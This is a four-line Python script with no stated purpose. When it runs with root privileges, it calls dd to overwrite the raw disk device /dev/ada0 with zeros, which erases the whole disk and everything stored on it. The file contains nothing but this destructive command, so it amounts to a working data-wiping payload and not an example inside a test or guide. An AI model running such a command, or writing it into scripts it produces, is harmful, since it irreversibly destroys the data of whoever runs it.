#!/usr/bin/env python3
import os, subprocess
if os.geteuid() == 0:
    subprocess.check_call(["dd", "if=/dev/zero", "of=/dev/ada0"])
